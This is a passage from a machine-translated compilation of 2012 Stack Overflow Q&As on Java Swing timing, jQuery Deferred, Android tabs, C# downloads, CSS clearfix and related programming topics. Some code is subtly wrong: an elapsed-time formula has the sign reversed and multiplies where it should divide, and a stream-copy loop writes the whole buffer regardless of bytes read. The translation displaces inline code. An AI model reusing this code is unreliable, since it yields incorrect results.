您可能认为您可以创建一个带有循环的线程，该循环`msec`在`Thread.sleep(1)`. **不要这样做！** 这种时机也是*完全错误*的。您的计算机使用抢占式多任务模型，这意味着*无法保证*您的线程会定期执行。也就是说，没有什么要求它`Thread.sleep(1)`会休眠一段`maximum`时间。保证是您的线程将**至少**休眠 1毫秒。这意味着如果您自己在软件中管理时钟，则无法确定时钟错误，并且此错误并非无关紧要。 **只是不要这样做！**时间应始终由您的操作系统测量，最好使用基于中断的计时器（这是`System.nanoTime`在大多数平台上工作的方式，如果不是所有平台的话）。

而不是使用线程，只需直接从原始线程调用您的`startTime`和方法。`stopTime`

尝试这个：

```
class ThreadGame {

    JButton button;
    MyAction my_action;
    private final Timer timer = new Timer();

    public static void main(String[] args) {
        ThreadGame tg = new ThreadGame();
    }

    public ThreadGame() {
        JFrame frame = new JFrame("Calculate time - Game");
        button = new JButton("Start");
        button.addActionListener(new MyAction());
        frame.add(button);
        frame.setSize(400, 400);
        frame.setVisible(true);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    class MyAction implements ActionListener {

        public void actionPerformed(ActionEvent e) {
            String text = (String) e.getActionCommand();

            if (text.equals("Start")) {
                timer.startTime();
                button.setText("Stop");
            } else {
                timer.stopTime();
                button.setText("Start");
            }
        }
    }

    class Timer {
        public double startTime = 0.0;
        public double stopTime = 0.0;
        public boolean running = false;
        public double elapsed = 0.0;

        public void startTime() {
            this.startTime = System.nanoTime();
            this.running = true;
        }

        public void stopTime() {
            this.stopTime = System.nanoTime();
            this.running = false;
        }

        // Elasped time in seconds
        public double getElapsedTime() {
            return (this.startTime-this.stopTime)*1000000000.0;
        }
    }
} 
```

**如果您想学习如何使用线程，请尝试编写一个应用程序来解决线程非常适合的问题。** 例如，编写一个小型 Swing 应用程序，让您从 Web 下载文件。下载文件时，更新 UI 中的进度条。下载应该在独立于 UI 线程的工作线程中进行，否则 UI 将在下载过程中阻塞。

另一个示例问题是编写线程光线追踪器（这里是用 C++ 编写的[示例教程）。](http://www.codermind.com/articles/Raytracer-in-C++-Introduction-What-is-ray-tracing.html)

如果您想要更简单的东西，请编写一个 Swing 时钟。在单独的线程中使用循环以定期更新 UI，但**不要**使用循环来管理时间。同样，不要试图在循环中保持时间，只需让操作系统保持时间，并使用循环来安排 UI 何时更新为当前操作系统时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:31:25.713

问题是开始按钮按下启动的对象与停止按钮按下停止的对象不同，因为*每次* 调用该方法时都会创建该对象。`Timer``Timer``actionPerformed(...)`

`Timer`需要是您`MyAction`班级中的一个字段。您也不需要所有线程启动/加入，因为该`Timer`对象非常简单和快速。

真的，您可以只使用`startTimeMillis`长字段而不是计时器。就像是：

```
class MyAction implements ActionListener {
   private long startTimeMillis;
   public void actionPerformed(ActionEvent e) {
        String text = (String) e.getActionCommand();

        if (text.equals("Start")) {
            startTimeMillis = System.currentTimeMillis();
            ...
         } else {
            System.out.println(System.currentTimeMillis() - startTimeMillis);
         }
     }
 } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:24:01.757

您永远不会调用`getElapsedTime()`该更新`elapsed`字段。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T16:27:51.677

只需这样做...

**-**`System.currentTimeMillis()`在**线程开始时**调用。

 ****-**`System.currentTimeMillis()`然后在**线程结束时**再次调用。

 ****-** `Subtract`以起始值结束以获得经过的时间......

**//////////////已编辑////////////////////**

确保`method`尝试操纵（即读取和写入）`variable`持有的`System.currentTimeMillis()`必须与 同步，以便根据...`synchronized keyword`不会发生竞争条件`Brian's Law`

`If you are writing a variable that might next be read by another thread, or reading a variable that might have last been written by another thread, you must use synchronization, and further, both the reader and the writer must synchronize using the same monitor lock.`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-12T16:34:07.503

`Timer`当您单击按钮时，您正在创建一个新的。使计时器成为您的类变量`MyAction`

下面的代码应该足以获得经过的时间。

```
 class MyAction implements ActionListener {
        final Timer timer = new Timer();            
        public void actionPerformed(ActionEvent e) {
            String text = (String) e.getActionCommand();                
            if (text.equals("Start")) {
                button.setText("Stop");
                timer.startTime();
            } else {
                timer.stopTime();
                System.out.println(timer.elapsed);
                button.setText("Start");
            }
        }
    } 
```****

# javascript - // 在 src="" 属性上使用而不是 http://

> ID：12392518
> 
> 赞同：0
> 
> 时间：2012-09-12T16:21:00.453
> 
> 标签：javascript, jquery, html

> **可能重复：**
> [速记为 // 用于脚本和链接标签？有人看到/使用过这个吗？](https://stackoverflow.com/questions/6503946/shorthand-http-as-for-script-and-link-tags-anyone-see-use-this-before)

我想我明白发生了什么，但在谷歌搜索时我没有找到任何确定的东西。在这样的代码中：

```
// talking about the src attribute
<script type="text/javascript" src="//use.typekit.net/%kitid%.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js"></script> 
```

我习惯 http:// 在那里。当我在 http 服务器上调用此页面时，它会定期对资源发出 HTTP 请求，因此我假设这是 http:// 的快捷方式。我猜这与不知道您所在的页面是否要使用 https:// 或 http:// 有关？有没有关于这种做法的文章或任何信息？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-12T16:22:48.910

使用`//`，请求将模仿父页面的协议。

看看这个： http: [//paulirish.com/2010/the-protocol-relative-url/](http://paulirish.com/2010/the-protocol-relative-url/)

# java - 调整 JLayeredPane 图层的大小

> ID：12392523
> 
> 赞同：3
> 
> 时间：2012-09-12T16:21:36.540
> 
> 标签：java, swing, java-7, jlayeredpane, jlayer

我在尝试使用`JLayeredPane`.

我做到了这一点：

![无侧板](../Images/d1718cd097e5877c3d9dc4ca6543c54a.png)

（希望你能看到块`G6`在标签上有一个绿色边框，显示选择了哪个块）

但是，当我将我的 2 添加`SidePanel`到我的`ChessBoard`面板上，然后在顶部有另一层，其标签*应该*准确地覆盖每个板块，但它没有：

![带侧板](../Images/a1586b3934a74ab59a053f66dbfb05e9.png)

如您所见，绿色边框周围的块`G2`已关闭。

`SidePanel`当我将s 添加到 the`ChessBoard`并将其添加到底层并将其大小设置为 600x600 然后添加顶层标签时，我将其缩小到明显的范围，该标签将完全适合块`ChessBoard`和绿色边框围绕选定的`JLabel`（以及下部`ChessBoard`方块[黑色或白色]）绘制，由于`SidePanel`s 减少了 600x600 的棋盘实际大小，它偏离中心绘制，现在它将是`600-sp1.getWidth()`x `600-sp2.getHeight()`。我尝试设置顶层的边界和首选大小来补偿它，但它似乎没有用。感谢您提供任何帮助：

**ChessBoardTest.java：**

```
import java.awt.*;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.util.HashMap;
import javax.swing.*;
import javax.swing.border.BevelBorder;

public class ChessBoardTest {

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {

            @Override
            public void run() {

                Dimension boardSize = new Dimension(600, 600);

                JFrame frame = new JFrame("Chess JLayeredPane Test");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setResizable(false);

                Container contentPane = frame.getContentPane();

                ChessBoard chessBoard = new ChessBoard();
                SidePanel sp1 = new SidePanel(new String[]{"8", "7", "6", "5", "4", "3", "2", "1"}, SidePanel.VERTICAL);
                SidePanel sp2 = new SidePanel(new String[]{"A", "B", "C", "D", "E", "F", "G", "H"}, SidePanel.HORIZONTAL);

                //adding these 2 side panels messes up the layout
                chessBoard.add(sp1, BorderLayout.WEST);
                chessBoard.add(sp2, BorderLayout.SOUTH);

                chessBoard.setPreferredSize(boardSize);
                chessBoard.setBounds(0, 0, boardSize.width, boardSize.height);

                ChessPieceLayer chessPieceLayer = new ChessPieceLayer();

            //chessPieceLayer.setPreferredSize(boardSize);
            //chessPieceLayer.setBounds(0, 0, boardSize.width, boardSize.height);

            //i've tried resizing to make up for the side panels but no result
            chessPieceLayer.setPreferredSize(new Dimension(600-sp1.getWidth(),600-sp2.getHeight()));
            chessPieceLayer.setBounds(0+sp1.getWidth(), 0+sp2.getHeight(), 600-sp1.getWidth(), 600-sp2.getHeight());

                JLayeredPane jLayeredPane = new JLayeredPane();
                jLayeredPane.setPreferredSize(boardSize);

                jLayeredPane.add(chessBoard, JLayeredPane.FRAME_CONTENT_LAYER);
                jLayeredPane.add(chessPieceLayer, JLayeredPane.MODAL_LAYER);

                contentPane.add(jLayeredPane);
                frame.pack();
                frame.setVisible(true);
            }
        });
    }
} 
```

**SidePanel.java：**

```
class SidePanel extends JPanel {

    final static String HORIZONTAL = "horizontal";
    final static String VERTICAL = "vertical";

    public SidePanel(String[] strings, String direction) {
        if (direction.equals(VERTICAL)) {
            setLayout(new GridLayout(8, 0));
        } else {
            setLayout(new GridLayout(0, 8));
        }
        setDoubleBuffered(true);
        for (String string : strings) {
            this.add(new JLabel(string, JLabel.CENTER));
        }

    }
} 
```

**棋盘.java：**

```
class ChessBoard extends JPanel {

    public ChessBoard() {
        super(new BorderLayout(), true);

        this.add(populateBoard(Color.white, Color.black), BorderLayout.CENTER);
    }

    private JPanel populateBoard(Color c1, Color c2) {
        JPanel panel = new JPanel(new GridLayout(8, 8));
        for (int i = 0; i < 8; i++) {
            for (int j = 0; j < 8; j++) {
                JPanel square = new JPanel(new BorderLayout());
                square.setBackground((i + j) % 2 == 0 ? c1 : c2);
                panel.add(square);
            }
        }
        return panel;
    }
} 
```

**ChessPieceLayer.java：**

```
class ChessPieceLayer extends JComponent {

    private HashMap<PiecePanel, String> panelsMap = new HashMap<>(64);
    final ChessPieceMouseListener listener;

    ChessPieceLayer() {
        super();
        listener = new ChessPieceMouseListener();
        setLayout(new GridLayout(8, 8));
        setDoubleBuffered(true);

        fillPanelsMap();
    }

    private void fillPanelsMap() {
        String[] cols = new String[]{"A", "B", "C", "D", "E", "F", "G", "H"};
        int[] rows = new int[]{1, 2, 3, 4, 5, 6, 7, 8};
        String row, col;
        int rowCount = 7, colCount = 0, trigger = 8;

        for (int i = 0; i < 64; i++) {

            if (trigger == 0) {
                colCount = 0;
                trigger = 8;
                rowCount--;
            }
            col = cols[colCount++];
            row = rows[rowCount] + "";
            trigger--;

            String location = col + row;

            PiecePanel square = createAndAddPiecesWithMouseListener(location);

            panelsMap.put(square, location);

        }
    }

    private PiecePanel createAndAddPiecesWithMouseListener(String location) {
        PiecePanel square = new PiecePanel(location, JLabel.CENTER);
        square.addMouseListener(listener);
        square.setText(location);
        this.add(square);
        return square;
    }
} 
```

**PiecePanel.java：**

```
class PiecePanel extends JLabel {

    private String location;

    public PiecePanel(String text, int horizontalAlignment) {
        super("", horizontalAlignment);
        this.location = text;
    }

    PiecePanel(String location) {
        this.location = location;
    }

    public String getPieceLocation() {
        return location;
    }

    public void setPieceLocation(String location) {
        this.location = location;
    }

    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);
    }
} 
```

**ChessPieceMouseListener.java:**

```
class ChessPieceMouseListener implements MouseListener {

    int counter = 0;
    PiecePanel this_pp, prev_pp;

    @Override
    public void mouseClicked(MouseEvent e) {
    }

    @Override
    public void mousePressed(MouseEvent e) {
    }

    @Override
    public void mouseReleased(MouseEvent e) {
        PiecePanel pp = (PiecePanel) e.getComponent();
        if (counter == 0) {
            this_pp = pp;
            this_pp.setBorder(new BevelBorder(0, Color.green, Color.green));
            JOptionPane.showMessageDialog(null, "From " + pp.getPieceLocation());
            counter = 1;
        } else {
            prev_pp = this_pp;
            this_pp = pp;
            prev_pp.setBorder(null);
            JOptionPane.showMessageDialog(null, "To " + pp.getPieceLocation());
            counter = 0;
        }
    }

    @Override
    public void mouseEntered(MouseEvent e) {
    }

    @Override
    public void mouseExited(MouseEvent e) {
    }
} 
```

起初我使用：

```
chessPieceLayer.setPreferredSize(boardSize);
chessPieceLayer.setBounds(0, 0, boardSize.width, boardSize.height); 
```

然后我尝试了：     

```
chessPieceLayer.setPreferredSize(new Dimension(600-sp1.getWidth(),600-sp2.getHeight()));
chessPieceLayer.setBounds(0+sp1.getWidth(), 0+sp2.getHeight(), 600-sp1.getWidth(), 600-sp2.getHeight()); 
```

但结果并没有什么不同

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-12T20:36:15.613

好的，我发现了问题，并且有一个简单的解决方案。下一次，试着把你的代码放在一个类中，这样我就不必做太多的复制/粘贴（这种不鼓励人们尝试你的代码）;-)。

无论如何，问题来自您的 SidePanel，它占用了 ChessBoardPanel 上的空间，因此引入了偏移量。解决方案很简单，您所要做的就是：

1.  添加`sp1`和`sp2`到`contentPane`
2.  在您的上`chessBoard`，`chessPieceLayer`只需将大小设置为 boardSize。

解释

1.  我们将 SidePanel 移动到内容窗格，这样它们就不会干扰您的图层。当您使用 JLayeredPane 时，您使用所谓的绝对布局或空布局。这意味着您必须注意组件的定位和大小。这使我想到第 2 点：
2.  当没有 LayoutManager 时，设置 preferredSize 是没有用的，因为没有 LayoutManager 来调用该方法。现在，默认情况下组件位于 (0,0) 中，因此您所要做的就是调用`setSize`. 如果您希望它们被偏移，您还需要调用`setLocation`，或在一次调用中连接这两个调用`setBounds`

# jquery - 将延迟与何时同步

> ID：12392525
> 
> 赞同：0
> 
> 时间：2012-09-12T16:21:38.927
> 
> 标签：jquery, jquery-deferred

我无法将已完成的 Deferred 与 $.when() 同步。我想在所有延期完成时收到通知，无论是解决还是失败。

我的问题是 when().always() 最初触发失败并且不等待其他延迟完成。不确定它是否是一个错误。

我做了一个例子，这是一个 JsFiddle：http: [//jsfiddle.net/m3REv/](http://jsfiddle.net/m3REv/)

来自它的js代码：

```
/* our multiple deferred we'd like to sync. */
var def1 = $.Deferred();
var def2 = $.Deferred();
var def3 = $.Deferred();

def1.done( function() { logger.log('1 done');} ).fail( function() {logger.log('1 fail');} );
def2.done( function() { logger.log('2 done');} ).fail( function() {logger.log('2 fail');} );
def3.done( function() { logger.log('3 done');} ).fail( function() {logger.log('3 fail');} );

$.when( def1, def2, def3 ).then( function() {
    logger.log('w then');
} ).done( function() {
    logger.log('w done');
} ).fail( function() {
    logger.log('w fail');
} ).always( function() {
    logger.log('w always');
});

def1.reject();
def2.resolve();
def3.resolve(); 
```

输出是：

```
1 fail
w fail
w always
2 done
3 done 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:37:21.930

解决方法：

```
var defCount = 3, state = 0;
var overallAlways = function () {
    if (++state < defCount) return;
    logger.log('correct always');
};

def1.done( function() { logger.log('1 done');} )
    .fail( function() {logger.log('1 fail');} )
    .always(overallAlways);
def2.done( function() { logger.log('2 done');} )
    .fail( function() {logger.log('2 fail');} )
    .always(overallAlways);
def3.done( function() { logger.log('3 done');} )
    .fail( function() {logger.log('3 fail');} )
    .always(overallAlways); 
```

[资源](http://jsfiddle.net/m3REv/3/)

或者有人认为像

```
function overallAlways(defObjects, callback) {
    var defCount = defObjects.length, state = 0;
    var alwaysCallback = function () {
        if (++state < defCount) return;
        callback.call(this);
    }
    $.each(defObjects, function (i, def) {
        def.always(alwaysCallback);
    });
}

var defs = [def1, def2, def3];
overallAlways(defs, function(){
    logger.log("overall always");
}); 
```

[资源](http://jsfiddle.net/m3REv/5/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-13T08:52:16.500

最后我写了一个插件，它是 jQuery.when() 的略微修改版本。我没有对它进行详尽的测试，但它现在适用于小提琴和我的个人使用。

这是插件加上示例的小提琴：

[http://jsfiddle.net/LTsLJ/](http://jsfiddle.net/LTsLJ/)

# iphone - iOS 6 中的 MapKit - 如何查找附近的地点...？

> ID：12392529
> 
> 赞同：5
> 
> 时间：2012-09-12T16:21:46.147
> 
> 标签：iphone, ios, mapkit, ios6

在 iOS 6 中使用 MapKit，我应该如何在没有特定坐标的情况下获取附近的位置？我也不确定它是否仍然可能......错误......*允许*......使用谷歌地图 API 来实现这个目标，因为这是我能想到的唯一方法。

我知道一切仍处于测试阶段，但我仍然在任何地方、论坛、Apple 的新 MapKit 文档中、任何地方都找不到有关此主题的信息。我想要做的就是在用户位置的“x”英里范围内搜索位置（例如，公园）。

看来，既然 Apple 已经开发了自己的 Maps 应用程序，他们应该有办法使用 MapKit 或 Core Location 来实现这一点……对吧？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T04:17:36.143

试试这个代码。这可能对您有所帮助。

```
URLManager *urlmanager = [[URLManager alloc] init];
        urlmanager.delegate = self;
        urlmanager.responseType = JSON_TYPE;
        urlmanager.commandName = @"Search";

NSString *locationString = [NSString stringWithFormat:@"%f,%f",latitude,longitude];
//Location where you want to search

NSString *key = @"AIzaSyCNRpero6aM451X0IfgFHAd-Y3eJUssqoa8`enter code here`0E";
//This is the secret key which you will get from the Google API Console when you register your app.

NSString *radiuos = @"15000";
//This is the area within which you want to search
NSString *keyword = @"Hotel";//Search keyword you want to search

NSMutableDictionary *arguments = [[NSMutableDictionary alloc] init]; // zero argument

[arguments setValue:key forKey:@"key"];

[arguments setValue:locationString forKey:@"location"];

[arguments setValue:radiuos forKey:@"radius"];

[arguments setValue:@"true" forKey:@"sensor"];

[arguments setValue:keyword forKey:@"keyword"];

NSLog(@"Arguments are %@",arguments);

[urlmanager urlCallGetMethod:[NSString stringWithFormat:@"https://maps.googleapis.com/maps/api/place/search/json"] withParameters:arguments]; 
```

# winforms - 带有子报告的 Microsoft VS2012 报告在 Dev 中工作但不是实时的

> ID：12392534
> 
> 赞同：0
> 
> 时间：2012-09-12T16:22:03.090
> 
> 标签：winforms, reportviewer, subreports

我几年前编写的一个 Windows 应用程序最近需要进行一些更改（最初用 VS2005 编写，使用 VS2008 修改，现在更新/修改为 VS2012 项目）。

该应用程序包含一个包含两个子报告的 Microsoft 报告。`ReportViewer1.LocalReport.SubreportProcessing`子报表数据是一个数据集，在事件期间填充。

向主报告添加了一个新字段，但未修改子报告。该报告在开发 PC 上按预期工作，但是当安装在客户端笔记本电脑上时，子报告失败并显示以下消息：- `Data retrieval failed for the sub-report, <report name>, located at <report...rdlc>. Please check the log files for more information`

客户端笔记本电脑上不生成日志文件

我尝试手动安装 CTP 2012 Microsoft Report 查看器，但安装失败，报告已存在较新版本（可能来自 SQL Server Express 2012，也同时安装）。

用于测试的数据库是从实时备份中恢复的，所以数据是一样的。添加`ReportDataSource`到子报告的子报告事件包含一个不会引发任何异常的 try-catch 块

在开发过程中，当我在 VS2012 中打开报告时，会打开一个对话框，询问是否应该将它们更新为 2012 格式，我允许这样做，尽管这可能与故障无关。

有没有人遇到过这个问题？有没有办法强制客户端笔记本电脑上的日志文件的物理输出？

更新

在代码中放入一些 MessagesBoxes 我找到了子报告不处理的原因，但我现在需要找出原因。

'LocalReport_SubreportProcessing' 事件为我的报告触发两次 - 每个子报告触发一次。

为了确定哪个子报表需要额外的数据源，我检查了“SubreportProcessingEventArgs.ReportPath”的值。在我的开发系统中，它具有报告的名称（减去 .rdlc 扩展名），但在客户端笔记本电脑上，该值为空。

我看不到报告是如何内置到输出中的。主报告在笔记本电脑上显示正常（只是缺少子报告），虽然我目前不知道从哪里显示 - 需要更多调查！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T00:15:22.767

我刚刚偶然发现了同样的问题。你不讨厌微软有时对我们这样做吗？

无论如何，我认为最好的解决方案是检查`SubreportProcessingEventArgs.DataSourceNames[0]`而不是检查`SubreportProcessingEventArgs.ReportPath`。这将（我检查过）具有子报表的数据源的名称。

如果您唯一地命名数据源，您可以识别哪个子报表正在调用事件并正确设置数据源。我通常将我的数据源命名为`{SubreportName}DataSet`，因此我所有的数据源名称中都包含子报表名称。祝你好运。

# database - 单独的生产数据库与单个生产数据库中的链接表

> ID：12392535
> 
> 赞同：1
> 
> 时间：2012-09-12T16:22:04.500
> 
> 标签：database, database-design, relational-database, soa, database-schema

首先，我不知道这是否是这个问题的正确平台。我希望是的。这基本上是一个架构问题，或者更具体地说是一个数据库设计问题。

我的公司要求我创建一个基于服务的网站，个人订户可以登录到他们自己的可定制零售店。与此要求相关的一个基本问题是设计数据库。据我所知，有两种主要方法

1.  为每个订阅者/客户创建一个基于模板的单独数据库。
2.  为所有客户端提供一个数据库，并根据主键字段链接表。

如果有人对上述情况有经验或可以提供任何有用的见解，请告诉我。

问候罗米

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:37:36.990

独立数据库

*   您可以轻松地将它们放到其他专用服务器上
*   您必须为 1,000 个客户端管理 1,000 个数据库
*   您的应用程序需要确定必须使用哪个数据库

一个有关系的数据库

*   您只需管理一个数据库
*   减少应用程序的额外复杂性（大量配置等）
*   您可以轻松地`JOIN`在所有客户端上使用表格。对于统计数据或其他任何东西。

# css - 这可能是新的clearfix吗？

> ID：12392536
> 
> 赞同：1
> 
> 时间：2012-09-12T16:22:05.120
> 
> 标签：css, clearfix

有没有更简化的使用方式`.clearfix`？

老的：

```
.clearfix:after {
    content: ".";
    display: block;
    clear: both;
    visibility: hidden;
    line-height: 0;
    height: 0;
} 
```

我的新明确修复：

```
.coreys-clearfix:after {
    content: "";
    display: block;
    clear: both;
} 
```

我把它通过一个验证器，我没有错误。有其他人知道或看到不能使用它的任何原因吗？它只保存了 3 行代码和一个`.`，但仍然如此。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:28:26.180

我不这么认为，不。

点的原因是为了`.clearfix:after`在旧版浏览器中工作。

Nicholas Gallagher 解释了原因：

> Firefox < 3.5 将受益于使用 Thierry 的方法，并添加了 visibility:hidden 以隐藏插入的字符。这是因为旧版 Firefox 需要内容："." 避免在某些情况下（例如，jsfiddle.net/necolas/K538S/）在正文和它的第一个子元素之间出现额外的空间。

这就是为什么`content`它不是空的，剩下的三行（`visibility`和`line-height`）`height`是为了确保 clearfix 实际上不会在您的布局中占用空间。

实际上，Nicholas 做了一个新的 clearfix，它用更少的字节做同样的工作。在这里阅读：http: [//nicolasgallagher.com/micro-clearfix-hack/](http://nicolasgallagher.com/micro-clearfix-hack/)

不过努力就好。:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-18T09:49:55.067

如果您想支持旧版浏览器，则需要更精细的 clearfix ：

```
.clearfix:before, .clearfix:after {
    content: "";
    display: table;
}

.clearfix:after {
    clear: both;
}

.clearfix {
    *zoom: 1;
} 
```

如果您不关心对旧浏览器的支持，那么可以这样做：

```
.clearfix:after {
    content:"";
    display:table;
    clear:both;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:36:12.060

该点用于旧版浏览器支持。如果不需要，可以使用“新”的。

**[这个答案实际上很好地解释了它。](https://stackoverflow.com/a/8554054/871050 "什么是clearfix？")**

# android - 选取框完成时触发事件

> ID：12392540
> 
> 赞同：4
> 
> 时间：2012-09-12T16:22:23.933
> 
> 标签：android, textview

I want to marquee text, and when the marquee completes (the 1 full marquee cycle), I want to trigger another event. 有没有好的方法来做到这一点？选中文本视图时，我没有看到 OnEnd 或类似功能

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-15T15:14:17.113

使用 custom `TextView`，您可以覆盖以在字段和字段的字段上`onDraw`使用反射（请参阅 grepcode 上的 TextView 代码等）。`mMarquee``mStatus``mMarquee`

`mStatus`选取框运行时值为 2，停止时值为 0。

`onDraw`被调用很多，但特别是在选取框完成后立即调用。

# android - 使用自定义视图复制 ActionBar Tab(s)

> ID：12392541
> 
> 赞同：5
> 
> 时间：2012-09-12T16:22:26.340
> 
> 标签：android, android-actionbar, actionbarsherlock

我想要一个带有自定义导航的 ActionBar，其中自定义视图看起来像标准操作栏选项卡。我知道这听起来像是在重新发明轮子，但这意味着我们可以将菜单按钮与选项卡放在同一行，如下所示。这是一个设计要求，实际上比标准的 android 行为对这个应用程序更有意义。 ![我希望标签看起来如何](../Images/abfc91b0741d5980973e235d09a6a9bc.png)

我尝试过使用 ActionBarSherlock 中的 IcsLinearLayout，如下所示：

```
<IcsLinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
          android:layout_width="fill_parent"
          android:orientation="horizontal"
          android:layout_height="50dip">
         <Button
             android:id="@+id/tab_1"
             android:layout_height="match_parent"
             android:gravity="center"
             android:layout_width="wrap_content"
             android:textStyle="bold"
             android:text="TAB_1"
             android:background="@drawable/abs__item_background_holo_light"
             />
        <Button
            android:id="@+id/tab_2"
            android:layout_height="match_parent"
            android:gravity="center"
            android:layout_width="wrap_content"
            android:textStyle="bold"
            android:text="TAB_2"
            android:background="@drawable/abs__item_background_holo_light"
             />
</IcsLinearLayout> 
```

但这复制了 ActionButtons，我不知道如何复制 Tabs。

我想我需要：

*   一个特殊的选项卡容器视图组（可能来自 ActionBarSherlock 库）
*   看起来像带有 ABS 库中背景资源的选项卡的视图。
*   一些代码表明单击视图后它保持选中状态（类似于 RadioButton）。

任何指向示例或类似解决方案的指针（即使在 ActionBarSherlock 库中）将不胜感激。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-10-16T02:40:48.750

//启用嵌入标签

```
//pre-ICS
if (actionBarSherlock instanceof ActionBarImpl) {
    enableEmbeddedTabs(actionBarSherlock);

//ICS and forward
} else if (actionBarSherlock instanceof ActionBarWrapper) {
    try {
        Field actionBarField = actionBarSherlock.getClass().getDeclaredField("mActionBar");
        actionBarField.setAccessible(true);
        enableEmbeddedTabs(actionBarField.get(actionBarSherlock));
    } catch (Exception e) {
        Log.e(TAG, "Error enabling embedded tabs", e);
    }
}

//helper method
private void enableEmbeddedTabs(Object actionBar) {
    try {
        Method setHasEmbeddedTabsMethod = actionBar.getClass().getDeclaredMethod("setHasEmbeddedTabs", boolean.class);
        setHasEmbeddedTabsMethod.setAccessible(true);
        setHasEmbeddedTabsMethod.invoke(actionBar, true);
    } catch (Exception e) {
        Log.e(TAG, "Error marking actionbar embedded", e);
    }
} 
```

此代码完美运行。在我的应用程序中尝试过。供进一步参考 - [https://groups.google.com/forum/#!topic/actionbarsherlock/hmmB1JqDeCk](https://groups.google.com/forum/#!topic/actionbarsherlock/hmmB1JqDeCk)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-03T07:40:00.163

通过使用层次结构查看器，我认为我们已经弄清楚了如何做到这一点。事实证明，这并不难。您需要 ABS 库中的 ScrollingTabContainerView，您可以向其中添加选项卡。

![狭窄的操作栏上的选项卡看起来如何](../Images/18f79fa33490a112147dc48b2c3971fc.png)

```
public class MainActivity extends SherlockActivity implements ActionBar.TabListener {
/**
 * Called when the activity is first created.
 */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    ScrollingTabContainerView root = new ScrollingTabContainerView(this);
    ActionBar.Tab tab1 = getSupportActionBar().newTab();
    tab1.setText("TAB 1");

    tab1.setTabListener(this);

    ActionBar.Tab tab2 = getSupportActionBar().newTab();
    tab2.setText("TAB 2");
    tab2.setTabListener(this);

    root.addTab(tab1, 0, true);
    root.addTab(tab2, 1, false);

    getSupportActionBar().setCustomView(root);
    getSupportActionBar().setDisplayShowCustomEnabled(true);
    getSupportActionBar().setTitle("App Title");

}

@Override
public boolean onCreateOptionsMenu(Menu menu){
    menu.add("MENU ITEM 1");
    menu.add("MENU ITEM 2");
    return true;
}

@Override
public void onTabSelected(ActionBar.Tab tab, FragmentTransaction ft) {
    //To change body of implemented methods use File | Settings | File Templates.
}

@Override
public void onTabUnselected(ActionBar.Tab tab, FragmentTransaction ft) {
    //To change body of implemented methods use File | Settings | File Templates.
}

@Override
public void onTabReselected(ActionBar.Tab tab, FragmentTransaction ft) {
    //To change body of implemented methods use File | Settings | File Templates.
} 
```

我希望这可以帮助别人。

# c# - C# 中的网页抓取问题：下载和解析压缩文本文件

> ID：12392543
> 
> 赞同：0
> 
> 时间：2012-09-12T07:42:04.043
> 
> 标签：c#, web-scraping

我正在写一个网络爬虫，从网站上下载内容。

遍历网站/URL，会触发临时 URL 的创建。这个新 URL 有一个压缩文本文件。必须下载并解析此压缩文件。

我在 C# 中使用及其函数编写了一个**刮板**。从捕获事件的指定位置读取压缩文件。`WebClient``DownloadFileAsync()``DownloadFileCompleted`

**我的问题是**触发了Windows*打开/保存对话框。*这需要用户输入并且自动化被中断。

你能建议一种绕过这个问题的方法吗？我很喜欢使用任何备用库重写代码。:)

谢谢阅读

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T14:43:18.543

您可以使用[“HttpWebRequest”](http://msdn.microsoft.com/en-us/library/system.net.httpwebrequest%28v=vs.100%29.aspx)执行请求并将流式传输的字节保存到磁盘。

```
var request = WebRequest.Create(@"your url here");
request.Method=WebRequestMethods.Http.Get;
var response = request.GetResponse();
using (var writeStream = new FileStream(@"path", FileMode.Create))
{
    using (var readStream = response.GetResponseStream())
    {
        var buffer = new byte[1024];
        var readCount = readStream.Read(buffer,0,buffer.Length);
        while (readCount > 0)
        {
            writeStream.Write(buffer,0,buffer.Length);
            readCount= readStream.Read(buffer,0,buffer.Length);
        }
    }
} 
```

# ios - 在 iOS Facebook SDK 3.0 上作为粉丝页面发布

> ID：12392546
> 
> 赞同：0
> 
> 时间：2012-09-12T16:22:44.463
> 
> 标签：ios, facebook, facebook-ios-sdk, iphone-sdk-3.2

我正在尝试以粉丝页面而不是用户的身份发布到粉丝页面。

在旧的 SDK 上，我只是询问“我/帐户”并收到访问令牌。现在我可以做同样的事情，但我无法使用该令牌，因为 FBRequest 从活动会话中获取其访问令牌（而且，它是一个只读属性）。

有谁知道如何使用页面令牌创建另一个会话或简单的 FBRequests？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T07:41:12.523

找到了一个解决方案，它不是最干净的，但它正在工作：
**注意：已针对 Facebook SDK 3.2+ 更新**

```
- (void)postAsFanPageWithToken:(NSString *)aFanPageToken {  
    if (self.selectedFanPage == nil) {
